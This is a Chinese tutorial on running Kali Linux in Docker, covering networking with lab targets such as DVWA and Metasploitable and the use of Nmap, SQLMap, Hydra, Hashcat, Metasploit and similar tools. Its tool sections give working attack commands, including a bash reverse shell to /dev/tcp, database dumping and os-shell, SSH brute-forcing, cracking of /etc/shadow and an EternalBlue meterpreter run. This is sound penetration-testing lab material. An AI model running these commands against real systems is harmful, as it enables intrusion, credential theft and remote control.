# Docker 部署 Kali Linux 无界面使用指南

> 把 Kali 装进容器，按需启动、即用即弃、环境隔离——本文聚焦无界面（headless）场景下如何用 Docker 跑 Kali，以及 Nmap、SQLMap、Burp Suite、Wireshark、Ghidra、Metasploit 等常用工具在容器内的实战用法。

---

## 目录

- [一、为什么用 Docker 跑 Kali](#一为什么用-docker-跑-kali)
- [二、镜像选择与拉取](#二镜像选择与拉取)
- [三、容器启动与持久化](#三容器启动与持久化)
- [四、网络模式与靶场互联](#四网络模式与靶场互联)
- [五、工具安装策略](#五工具安装策略)
- [六、命令行工具实战](#六命令行工具实战)
- [七、GUI 工具无界面使用方案](#七gui-工具无界面使用方案)
- [八、数据持久化与导出](#八数据持久化与导出)
- [九、Docker Compose 一键启动靶场](#九docker-compose-一键启动靶场)
- [十、常见问题排查](#十常见问题排查)
- [十一、速查表](#十一速查表)

---

## 一、为什么用 Docker 跑 Kali

### 1. 适用场景

- 服务器、云主机、WSL2 上没有图形界面，只需要命令行工具
- 多人共用一台机器，希望环境隔离、互不污染
- 临时拉起一个干净的攻击环境，用完即删
- CI/CD 中跑自动化扫描脚本
- 在 macOS / Windows 上跑 Linux 原生安全工具

### 2. 优势与局限

| 维度 | 优势 | 局限 |
|------|------|------|
| 启动速度 | 秒级启动，远快于虚拟机 | — |
| 资源占用 | 共享宿主内核，开销小 | 无法运行独立内核模块 |
| 环境隔离 | 容器间互不影响 | 默认无 GUI，图形工具需特殊处理 |
| 无线渗透 | — | 默认无法直接调用宿主无线网卡（需特殊配置） |
| 蓝牙/硬件外设 | — | 默认无法访问宿主硬件外设 |
| 持久化 | 通过 volume 保存数据 | 容器销毁后未挂载的数据丢失 |

> 💡 结论：Docker 非常适合跑 Web 渗透、CTF、漏洞扫描、密码爆破、流量分析等以命令行为主的任务；不适合做无线渗透、需要内核模块或硬件外设的任务，这类任务请用虚拟机或物理机。

---

## 二、镜像选择与拉取

### 1. 官方镜像一览

| 镜像 | 体积 | 说明 | 适用场景 |
|------|------|------|----------|
| `kalilinux/kali-rolling` | ~120MB | 最小化镜像，仅基础系统，无任何工具 | 自定义构建，按需装工具（推荐） |
| `kalilinux/kali-last-snapshot` | ~120MB | 滚动发布的稳定快照 | 需要稳定版本时使用 |
| `kalilinux/kali-exdev` | ~150MB | 开发者镜像，含编译工具链 | 需要编译 PoC、exploit |
| `kali-tool-tree` 系列 | 较大 | 按分类预装工具的镜像树 | 想直接用预装工具 |
| 第三方 `metasploitframework/metasploit-framework` | ~600MB | 仅含 Metasploit | 单跑 MSF |

### 2. 拉取镜像

```bash
# 拉取官方最小化镜像（推荐起点）
docker pull kalilinux/kali-rolling

# 拉取稳定快照版
docker pull kalilinux/kali-last-snapshot

# 查看本地镜像
docker images | grep kali
```

### 3. 配置国内软件源加速

镜像默认使用 Kali 官方源，国内拉取包很慢。首次进入容器后立即换成清华源：

```bash
# 进入容器
docker run -it kalilinux/kali-rolling /bin/bash

# 在容器内换源
cat > /etc/apt/sources.list <<'EOF'
deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free non-free-firmware contrib
EOF

# 导入签名 key（防止 GPG 报错）
wget -qO - https://archive.kali.org/archive-key.asc | apt-key add -

# 更新
apt update && apt full-upgrade -y
```

---

## 三、容器启动与持久化

### 1. 基础启动

```bash
# 临时进入容器，退出即销毁
docker run -it --rm kalilinux/kali-rolling /bin/bash

# 后台常驻容器，命名 kali-box
docker run -d --name kali-box \
  --restart unless-stopped \
  kalilinux/kali-rolling tail -f /dev/null

# 进入运行中的容器
docker exec -it kali-box /bin/bash
```

### 2. 持久化目录（强烈推荐）

把工具配置、字典、扫描结果、exploit 代码等挂载到宿主，避免容器销毁数据丢失。

```bash
# 宿主机准备持久化目录
mkdir -p ~/kali-data/{wordlists,loot,tools,config,exploits}

# 启动容器并挂载
docker run -it --name kali-box \
  -v ~/kali-data:/root/data \
  -v ~/kali-data/wordlists:/usr/share/wordlists \
  kalilinux/kali-rolling /bin/bash
```

挂载点约定（建议）：

| 容器内路径 | 用途 |
|-----------|------|
| `/root/data/wordlists` | 字典文件 |
| `/root/data/loot` | 扫描结果、shell、抓到的凭证 |
| `/root/data/tools` | 自定义脚本、自定义工具 |
| `/root/data/config` | 工具配置文件备份 |
| `/root/data/exploits` | exploit 代码 |

### 3. 把容器做成自定义镜像

容器内装好工具后，commit 成镜像，下次直接用：

```bash
# 在容器内装好工具后退出
exit

# 提交为自定义镜像（在宿主机执行）
docker commit kali-box kali-custom:v1

# 查看新镜像
docker images | grep kali-custom

# 用新镜像启动
docker run -it --name kali-v1 kali-custom:v1 /bin/bash

# 推送到私有仓库（可选）
docker tag kali-custom:v1 registry.example.com/kali-custom:v1
docker push registry.example.com/kali-custom:v1
```

### 4. 用 Dockerfile 构建可复现镜像

推荐做法：把装工具的过程写成 Dockerfile，版本可追踪、可复现。

```dockerfile
# Dockerfile
FROM kalilinux/kali-rolling

# 换源
RUN echo "deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free non-free-firmware contrib" > /etc/apt/sources.list

# 装基础工具与常用渗透工具
RUN apt update && apt install -y --no-install-recommends \
    nmap \
    sqlmap \
    nikto \
    gobuster \
    dirb \
    wfuzz \
    hydra \
    medusa \
    hashcat \
    john \
    metasploit-framework \
    exploitdb \
    netcat-traditional \
    socat \
    tcpdump \
    tshark \
    python3 \
    python3-pip \
    git \
    vim \
    curl \
    wget \
    proxychains4 \
    && rm -rf /var/lib/apt/lists/*

# 工作目录
WORKDIR /root

# 默认进入 shell
CMD ["/bin/bash"]
```

构建与运行：

```bash
# 构建
docker build -t kali-custom:v1 .

# 运行
docker run -it --rm \
  -v ~/kali-data:/root/data \
  --name kali kali-custom:v1
```

---

## 四、网络模式与靶场互联

### 1. 四种网络模式对比

| 模式 | 命令参数 | 容器网络 | 典型用途 |
|------|---------|---------|---------|
| Bridge（默认） | 无需指定 | 独立网段，NAT 出网 | 默认隔离环境 |
| Host | `--net host` | 与宿主共享网络栈 | 扫描宿主同网段，性能最高 |
| Container | `--net container:<id>` | 与指定容器共享 | 攻击容器与靶场容器同网段 |
| None | `--net none` | 无网络 | 离线分析、本地爆破 |

### 2. Bridge 模式：扫描外部靶场

```bash
# 启动攻击容器
docker run -it --name kali kali-custom:v1

# 容器内扫描宿主网段
nmap -sn 172.17.0.0/24
```

### 3. Host 模式：扫描宿主同网段

```bash
# 共享宿主网络栈
docker run -it --rm --net host kali-custom:v1

# 容器内直接扫描宿主所在局域网
nmap -sn 192.168.1.0/24
```

### 4. 攻击容器与靶场容器互联

最常用场景：起一个 DVWA 靶场容器，再起一个 Kali 容器，让两者在同一个 Docker 网络里互访。

```bash
# 1. 创建自定义网络
docker network create lab

# 2. 启动靶场容器（加入 lab 网络，命名 dvwa）
docker run -d --name dvwa --network lab vulnerables/web-dvwa

# 3. 启动攻击容器（加入同一 lab 网络）
docker run -it --rm --network lab \
  -v ~/kali-data:/root/data \
  kali-custom:v1

# 4. 在 Kali 容器内，直接用容器名访问靶场
nmap -p- dvwa
curl http://dvwa/
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=xxx" --batch
```

> 💡 Docker 自定义网络会自动建 DNS，攻击容器内可用靶场容器名作为主机名直接访问，无需查 IP。

### 5. 端口映射：让靶场暴露给宿主访问

```bash
# 靶场容器把 80 端口映射到宿主 8080
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa

# 在宿主浏览器访问 http://localhost:8080
```

---

## 五、工具安装策略

### 1. Kali 元包（metapackage）

Kali 把工具按用途打包成元包，按需安装：

| 元包 | 包含工具类型 | 体积 |
|------|------------|------|
| `kali-linux-headless` | 无界面常用工具（推荐） | ~2GB |
| `kali-linux-large` | 大型常用工具集合 | ~9GB |
| `kali-linux-default` | 默认桌面版常用工具 | ~7GB |
| `kali-linux-web` | Web 渗透工具 | ~3GB |
| `kali-linux-passwords` | 密码破解工具 | ~1GB |
| `kali-linux-wireless` | 无线渗透工具 | ~1GB |
| `kali-linux-forensics` | 取证工具 | ~3GB |
| `kali-linux-reverse` | 逆向工具 | ~3GB |
| `kali-linux-top10` | Top 10 工具 | ~2GB |

### 2. 推荐安装组合

```bash
# 最小化：只装最常用命令行工具
apt install -y nmap sqlmap hydra hashcat john gobuster \
  nikto dirb wfuzz whatweb theharvester recon-ng \
  netcat-traditional socat tcpdump tshark \
  metasploit-framework exploitdb git curl wget vim

# 无界面完整套件（推荐）
apt install -y kali-linux-headless

# Web 渗透专项
apt install -y kali-linux-web
```

### 3. 验证安装

```bash
# 检查关键工具
which nmap sqlmap msfconsole hydra hashcat gobuster

# 初始化 metasploit 数据库
msfdb init

# 更新 exploitdb
searchsploit -u
```

---

## 六、命令行工具实战

命令行工具在 Docker 中使用与原生 Kali 完全一致，下面给出每个工具的实战命令。

### 1. Nmap：端口与服务扫描

```bash
# 全端口扫描，输出到挂载目录
nmap -p- -T4 -A -oN /root/data/loot/nmap_full.txt 192.168.1.10

# UDP 扫描（需 root，容器内默认是 root）
nmap -sU --top-ports 100 -oN /root/data/loot/nmap_udp.txt 192.168.1.10

# 漏洞脚本扫描
nmap -sV --script vuln -oN /root/data/loot/nmap_vuln.txt 192.168.1.10

# 扫描整个网段
nmap -sn 192.168.1.0/24 -oG /root/data/loot/nmap_hosts.txt
```

### 2. SQLMap：SQL 注入

```bash
# GET 注入
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abc123" \
  --batch --dbs

# POST 注入（用 burp 抓包保存为 req.txt）
sqlmap -r /root/data/req.txt --batch --dbs

# 拖库
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abc123" \
  -D dvwa --dump --batch

# os-shell（拿到 DBA 权限后写 webshell）
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

### 3. Hydra：密码爆破

```bash
# SSH 爆破
hydra -L /root/data/wordlists/users.txt \
      -P /root/data/wordlists/passwords.txt \
      -f -o /root/data/loot/hydra_ssh.txt \
      ssh://192.168.1.10

# HTTP 表单爆破
hydra -L users.txt -P passwords.txt \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" \
  -V http://192.168.1.10

# MySQL 爆破
hydra -L users.txt -P passwords.txt mysql://192.168.1.10
```

### 4. Hashcat：GPU/ CPU 哈希破解

容器内一般没有 GPU，用 CPU 模式即可（速度慢但能用）。如有宿主 GPU，需用 `--gpus all` 启动容器并装 NVIDIA 驱动。

```bash
# 查看 hash 类型编号
hashcat --help | grep -i md5

# MD5 破解
hashcat -m 0 -a 0 \
  /root/data/loot/hashes.txt \
  /root/data/wordlists/rockyou.txt \
  -o /root/data/loot/cracked.txt

# bcrypt($2y$) 破解
hashcat -m 3200 -a 0 hashes.txt rockyou.txt

# 直接用 rockyou（在 /usr/share/wordlists/ 下解压）
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 5. John the Ripper：传统哈希破解

```bash
# 破解 /etc/shadow
unshadow /etc/passwd /etc/shadow > /root/data/loot/hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /root/data/loot/hashes.txt

# 查看已破解结果
john --show /root/data/loot/hashes.txt
```

### 6. Gobuster：目录爆破

```bash
# 目录爆破
gobuster dir -u http://dvwa/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -o /root/data/loot/gobuster_dvwa.txt

# 子域名爆破
gobuster dns -d example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -o /root/data/loot/subdomains.txt
```

### 7. Wfuzz：模糊测试

```bash
# 目录模糊
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 http://dvwa/FUZZ

# 参数模糊（找注入点）
wfuzz -c -w params.txt \
  http://dvwa/page.php?id=FUZZ
```

### 8. Nikto：Web 漏洞扫描

```bash
nikto -h http://dvwa/ -o /root/data/loot/nikto_dvwa.txt

# 走代理（结合 Burp）
nikto -h http://dvwa/ -useproxy http://127.0.0.1:8080
```

### 9. WhatWeb：指纹识别

```bash
whatweb http://dvwa/
whatweb -a 3 http://example.com/
```

### 10. theHarvester：信息收集

```bash
theHarvester -d example.com -b all -f /root/data/loot/harvester.html
```

### 11. Searchsploit：漏洞库搜索

```bash
# 搜索漏洞
searchsploit apache 2.4
searchsploit -x 12345    # 查看 12345 号 exploit

# 复制 exploit 到工作目录
searchsploit -m 12345 /root/data/exploits/

# 在线版（联网时）
searchsploit --nmap /root/data/loot/nmap_full.xml
```

### 12. Masscan：高速端口扫描

```bash
# 万兆扫描，速度快（注意网络负载）
masscan -p1-65535 192.168.1.0/24 --rate=1000 \
  -oJ /root/data/loot/masscan.json
```

### 13. Netcat / Socat：网络瑞士军刀

```bash
# 监听反弹 shell
nc -lvnp 4444

# 反弹 shell（在靶机上执行，容器侧监听）
bash -i >& /dev/tcp/172.17.0.2/4444 0>&1

# 文件传输（接收端）
nc -lvnp 4444 > received_file

# 文件传输（发送端）
nc 172.17.0.2 4444 < file_to_send
```

### 14. Proxychains：代理链

```bash
# 配置 /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# 通过代理扫描
proxychains nmap -sT -Pn target.com
proxychains curl http://target.com
```

### 15. TCPDump / Tshark：流量抓包

容器内抓包不需要 GUI，使用 tshark 替代 Wireshark。

```bash
# 抓取指定接口流量
tcpdump -i eth0 -w /root/data/loot/capture.pcap

# tshark 解析 pcap 文件
tshark -r /root/data/loot/capture.pcap -Y "http" -T fields \
  -e ip.src -e http.host -e http.request.uri

# 实时抓 HTTP 流量
tshark -i eth0 -Y "http.request" -T fields \
  -e ip.src -e http.host -e http.request.uri
```

---

## 七、GUI 工具无界面使用方案

Docker 默认无界面，但许多 GUI 工具仍可在容器内运行，方案有三类：

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| X11 转发 | 把容器内 GUI 显示到宿主 X Server | 简单，无需 VNC | 宿主需 X Server（Linux 原生，macOS/Win 需 XQuartz/VcXsrv） |
| VNC | 容器内跑 VNC server，宿主用 VNC 客户端连接 | 跨平台，远端可用 | 占用容器资源，配置稍复杂 |
| Headless 模式 | 用工具自身的 CLI 模式或替代工具 | 无需 GUI，纯命令 | 部分工具无 CLI 等价物 |

### 1. X11 转发：在宿主显示容器 GUI

#### Linux 宿主

```bash
# 启动容器时挂载 X11 socket 并授权
docker run -it --rm \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  --net host \
  kali-custom:v1

# 允许本地连接 X Server（在宿主执行）
xhost +local:

# 容器内启动 GUI 工具
firefox &
burpsuite &
```

#### macOS 宿主（XQuartz）

```bash
# 1. 安装 XQuartz
brew install --cask xquartz
open -a XQuartz

# 2. 在 XQuartz 偏好设置中允许"从网络客户端连接"

# 3. 获取宿主 IP（在 macOS 上）
IP=$(ifconfig en0 | grep inet | awk '$1=="inet"{print $2}')
export DISPLAY=$IP:0

# 4. 启动容器
docker run -it --rm \
  -e DISPLAY=$IP:0 \
  kali-custom:v1
```

#### Windows 宿主（VcXsrv）

1. 安装 VcXsrv，启动 XLaunch
2. 选择 "Multiple windows"，Display number 默认 0
3. 勾选 "Disable access control"
4. 启动容器：

```powershell
docker run -it --rm `
  -e DISPLAY=host.docker.internal:0 `
  -v /tmp/.X11-unix:/tmp/.X11-unix `
  kali-custom:v1
```

### 2. VNC：容器内远程桌面

适合服务器场景，容器内跑完整桌面环境。

```dockerfile
# Dockerfile.vnc
FROM kali-custom:v1

# 装桌面 + VNC
RUN apt update && apt install -y --no-install-recommends \
    xfce4 xfce4-terminal \
    tightvncserver \
    dbus-x11 \
    firefox-esr \
    burpsuite \
    && rm -rf /var/lib/apt/lists/*

# 设置 VNC 密码
RUN mkdir -p ~/.vnc && \
    echo "kali123" | vncpasswd -f > ~/.vnc/passwd && \
    chmod 600 ~/.vnc/passwd

# 启动脚本
RUN echo '#!/bin/bash\n\
vncserver :1 -geometry 1280x800 -depth 24\n\
tail -f /root/.vnc/*.log' > /start.sh && chmod +x /start.sh

EXPOSE 5901
CMD ["/start.sh"]
```

构建与连接：

```bash
# 构建
docker build -f Dockerfile.vnc -t kali-vnc:v1 .

# 启动，把 5901 端口映射到宿主
docker run -d --name kali-vnc -p 5901:5901 kali-vnc:v1

# 用任意 VNC 客户端连接 localhost:5901，密码 kali123
```

### 3. 各 GUI 工具的具体方案

#### Burp Suite

Burp 必须有界面（社区版无 CLI），用 X11 转发或 VNC。

```bash
# 容器内启动（X11 转发场景）
burpsuite &

# 想让宿主浏览器访问 Burp 代理：
# 启动容器时映射 8080 端口
docker run -it --rm -p 8080:8080 \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  kali-custom:v1

# 然后宿主浏览器设置代理为 127.0.0.1:8080
```

如果要纯命令行做主动扫描，可换用 `ffuf`、`nuclei`、`whatweb` 等替代品：

```bash
# nuclei 模板化漏洞扫描（Burp 的轻量替代）
apt install -y nuclei
nuclei -u http://dvwa/ -o /root/data/loot/nuclei.txt

# ffuf 模糊测试（Burp Intruder 替代）
apt install -y ffuf
ffuf -u http://dvwa/FUZZ -w wordlist.txt -mc 200,301
```

#### Wireshark

容器内用 `tshark` 完全替代，无需 GUI。

```bash
# 抓包
tshark -i eth0 -w /root/data/loot/capture.pcap

# 实时显示 HTTP 请求
tshark -i eth0 -Y "http.request" -T fields \
  -e ip.src -e http.host -e http.request.uri

# 在宿主用 Wireshark 打开容器抓的 pcap
# 把 /root/data/loot/capture.pcap 复制到宿主即可
```

如果一定要用 GUI Wireshark，配合 X11 转发并加 `--cap-add=NET_ADMIN`：

```bash
docker run -it --rm \
  --cap-add=NET_ADMIN \
  --net host \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  kali-custom:v1

# 容器内
wireshark &
```

#### Metasploit

Metasploit 的 `msfconsole` 是纯命令行，无需 GUI。

```bash
# 启动 msfconsole
msfconsole

# 初始化数据库
msfdb init

# 常用流程
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 (exploit) > set RHOSTS 192.168.1.10
msf6 (exploit) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 (exploit) > set LHOST 172.17.0.2
msf6 (exploit) > exploit

# 命令行直接执行模块（适合脚本化）
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
  set RHOSTS 192.168.1.10; \
  set LHOST 172.17.0.2; \
  exploit; exit"
```

> 💡 反弹 shell 注意：容器内监听 LHOST 必须是容器 IP（如 172.17.0.2），而非宿主 IP；靶机能路由到容器网段才行。

#### Ghidra

Ghidra 提供 headless 模式，可在无界面下批量反编译。

```bash
# 安装
apt install -y ghidra

# headless 反编译整个二进制
/opt/ghidra/support/analyzeHeadless \
  /root/data/ghidra_project proj1 \
  -import /root/data/sample.bin \
  -postScript /opt/ghidra/Ghidra/Features/Decompiler/ghidra_scripts/DecompileHeadless.java \
  -scriptlog /root/data/loot/ghidra.log

# 如果要 GUI，配合 X11 转发
docker run -it --rm \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  kali-custom:v1

# 容器内
ghidra &
```

#### BloodHound

无界面下采集数据用 `bloodhound-python`（采集器），数据导入 Neo4j 后可用 cypher 查询替代可视化。

```bash
# 装采集器
pip3 install bloodhound

# 采集域数据（在 Kali 容器内执行）
bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.5 \
  -c All -o /root/data/loot/bloodhound/

# 起一个 Neo4j 容器
docker run -d --name neo4j -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/password \
  neo4j:latest

# 把采集到的 json 导入 Neo4j（命令行用 cypher-shell）
cat /root/data/loot/bloodhound/*.json | \
  docker exec -i neo4j cypher-shell -u neo4j -p password \
  "CALL apoc.periodic.iterate(...);"

# 如果要看图形界面，用 X11 转发起 bloodhound GUI
bloodhound &
```

#### Maltego

Maltego 强依赖 GUI 且无 headless 替代品，Docker 中不推荐，建议在宿主直接安装。

---

## 八、数据持久化与导出

### 1. 挂载目录（最常用）

```bash
# 启动时挂载，所有写入 /root/data 的数据都在宿主 ~/kali-data
docker run -it --rm \
  -v ~/kali-data:/root/data \
  kali-custom:v1
```

### 2. docker cp：从容器复制到宿主

```bash
# 容器没挂载目录时，用 cp 复制文件
docker cp kali-box:/root/loot/scan.txt ~/loot/

# 复制整个目录
docker cp kali-box:/root/loot ~/loot/
```

### 3. 卷（named volume）

适合数据频繁使用、不希望污染宿主目录。

```bash
# 创建卷
docker volume create kali-data

# 使用卷
docker run -it --rm -v kali-data:/root/data kali-custom:v1

# 查看卷数据
docker volume inspect kali-data

# 备份卷到 tar
docker run --rm -v kali-data:/data -v $(pwd):/backup \
  alpine tar cvf /backup/kali-data.tar /data

# 恢复
docker run --rm -v kali-data:/data -v $(pwd):/backup \
  alpine tar xvf /backup/kali-data.tar -C /
```

### 4. 导出整个容器文件系统

```bash
# 把容器当前状态导出为 tar
docker export kali-box | gzip > kali-box.tar.gz

# 导入为镜像
gunzip -c kali-box.tar.gz | docker import - kali-imported:v1
```

---

## 九、Docker Compose 一键启动靶场

把 DVWA、Metasploitable、Kali 攻击容器用 docker-compose 编排，一键起一套完整靶场。

### 1. 文件结构

```
kali-lab/
├── docker-compose.yml
├── kali/
│   └── Dockerfile
└── data/
    ├── wordlists/
    └── loot/
```

### 2. docker-compose.yml

```yaml
version: '3.8'

networks:
  lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16

services:
  # DVWA 靶场
  dvwa:
    image: vulnerables/web-dvwa
    networks: [lab]
    ports:
      - "8080:80"

  # Metasploitable2 靶场（含大量漏洞服务）
  metasploitable:
    image: tleemcleveland/metasploitable2
    networks: [lab]
    # 不暴露端口，仅攻击容器访问

  # Juice Shop 现代化 Web 靶场
  juice:
    image: bkimminich/juice-shop
    networks: [lab]
    ports:
      - "3000:3000"

  # Kali 攻击容器
  kali:
    build: ./kali
    networks: [lab]
    volumes:
      - ./data:/root/data
    # 保持容器常驻
    command: tail -f /dev/null
    stdin_open: true
    tty: true
    # 给一些权限以便装包、抓包
    cap_add:
      - NET_ADMIN
```

### 3. kali/Dockerfile

```dockerfile
FROM kalilinux/kali-rolling

RUN echo "deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free non-free-firmware contrib" > /etc/apt/sources.list

RUN apt update && apt install -y --no-install-recommends \
    nmap sqlmap nikto gobuster dirb wfuzz whatweb \
    hydra medusa hashcat john \
    metasploit-framework exploitdb \
    netcat-traditional socat tcpdump tshark \
    python3 python3-pip git vim curl wget \
    proxychains4 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /root
CMD ["/bin/bash"]
```

### 4. 启动与使用

```bash
# 启动整套靶场
cd kali-lab
docker-compose up -d

# 进入 Kali 容器
docker-compose exec kali /bin/bash

# 容器内测试连通性
nmap -p- dvwa
nmap -p- metasploitable
curl http://juice:3000

# 扫描结果保存到挂载目录
nmap -p- -A metasploitable -oN /root/data/loot/meta_full.txt

# 关闭整套环境
docker-compose down

# 关闭并删除数据卷（谨慎）
docker-compose down -v
```

---

## 十、常见问题排查

### 1. 容器内无法联网

```bash
# 1. 检查容器网络
docker exec kali-box ip addr
docker exec kali-box ping -c 1 8.8.8.8

# 2. 检查 DNS
docker exec kali-box cat /etc/resolv.conf

# 3. 重启 docker 服务
sudo systemctl restart docker

# 4. 检查 iptables（宿主）
sudo iptables -L DOCKER -n
```

### 2. apt update 报 GPG 错误

```bash
# 容器内导入 Kali key
wget -qO - https://archive.kali.org/archive-key.asc | apt-key add -

# 或换用 http 源（临时绕过 HTTPS 问题）
echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
```

### 3. 工具找不到

```bash
# 查看是否装了
dpkg -l | grep nmap

# 查看包名（Kali 工具名可能与命令名不同）
apt search "burp suite"
apt search sqlmap

# 直接用 searchsploit 找
searchsploit -m 12345
```

### 4. X11 转发无效（GUI 起不来）

```bash
# 1. 检查 DISPLAY 变量
echo $DISPLAY

# 2. 宿主授权
xhost +local:

# 3. 测试 X Server
docker run -it --rm \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  kali-custom:v1 \
  xeyes

# 4. macOS 用户检查 XQuartz 是否运行
ps aux | grep X11
```

### 5. 抓包无权限

```bash
# 启动容器时加 NET_ADMIN
docker run -it --rm --cap-add=NET_ADMIN --net host kali-custom:v1

# 容器内
tcpdump -i eth0
```

### 6. metasploit 数据库初始化失败

```bash
# 容器内
msfdb delete
msfdb init

# 检查 postgresql
service postgresql status
service postgresql start
```

### 7. 反弹 shell 收不到

```bash
# 1. 检查 LHOST 是否正确
# 容器内监听必须用容器 IP
ip addr show eth0
nc -lvnp 4444

# 2. 靶机到容器的路由
# 如果靶机在另一个容器（同 lab 网络），用容器名访问
# 如果靶机在宿主局域网，用 host 网络模式启动攻击容器
docker run -it --rm --net host kali-custom:v1
```

### 8. 容器退出后丢失数据

```bash
# 1. 检查是否挂载了 volume
docker inspect kali-box | grep -A5 Mounts

# 2. 用 commit 把当前容器存为镜像
docker commit kali-box kali-custom:v2

# 3. 用挂载的方式重启
docker run -it --rm -v ~/kali-data:/root/data kali-custom:v1
```

---

## 十一、速查表

### 1. 容器生命周期

```bash
# 启动
docker run -it --name kali -v ~/kali-data:/root/data kali-custom:v1

# 进入已存在容器
docker exec -it kali /bin/bash

# 查看容器
docker ps -a

# 停止 / 启动 / 重启
docker stop kali
docker start kali
docker restart kali

# 删除容器
docker rm -f kali

# 把容器存为镜像
docker commit kali kali-custom:v2

# 用 Dockerfile 构建镜像
docker build -t kali-custom:v1 .
```

### 2. 网络模式速查

| 需求 | 命令 |
|------|------|
| 扫描宿主局域网 | `--net host` |
| 与靶场容器同网段 | `--network lab` |
| 端口映射 | `-p 8080:80` |
| 隔离环境 | 默认 bridge |
| 抓包 | `--cap-add=NET_ADMIN` |
| GPU 加速 hashcat | `--gpus all` |

### 3. 持久化速查

| 需求 | 方法 |
|------|------|
| 数据持久化 | `-v ~/kali-data:/root/data` |
| 配置持久化 | `-v ~/kali-config:/root/.config` |
| 字典共享 | `-v ~/wordlists:/usr/share/wordlists` |
| 复制文件出来 | `docker cp kali:/root/file .` |
| 整容器导出 | `docker export kali | gzip > kali.tar.gz` |

### 4. 常用工具一行命令

```bash
# Nmap 全端口
nmap -p- -T4 -A -oN /root/data/loot/nmap.txt TARGET

# SQLMap 注入
sqlmap -u "URL" --batch --dbs

# Hydra SSH 爆破
hydra -L users.txt -P pass.txt ssh://TARGET

# Gobuster 目录爆破
gobuster dir -u URL -w wordlist.txt -x php

# Nikto 扫描
nikto -h URL -o result.txt

# Searchsploit
searchsploit KEYWORD

# msfconsole
msfconsole -q -x "use MODULE; set RHOSTS X; exploit; exit"

# tshark 抓包
tshark -i eth0 -w /root/data/loot/cap.pcap

# Hashcat CPU
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### 5. 一键起靶场（推荐工作流）

```bash
# 准备目录
mkdir -p ~/kali-lab/{kali,data/wordlists,data/loot}
cd ~/kali-lab

# 写 docker-compose.yml 和 kali/Dockerfile（见第九章）

# 启动靶场
docker-compose up -d

# 进入 Kali 攻击容器
docker-compose exec kali /bin/bash

# 扫描靶场
nmap -p- dvwa metasploitable juice

# 保存结果到挂载目录
nmap -p- -A dvwa -oN /root/data/loot/dvwa.txt

# 退出后关掉靶场
exit
docker-compose down
```

---

> 📌 相关文档：[Kali Linux 实战使用指南](Kali%20Linux实战使用指南.md) — 原生 Kali 系统安装与工具实战；[CTF 工具集锦与脚本](CTF工具集锦与脚本.md) — CTF 比赛工具与脚本。
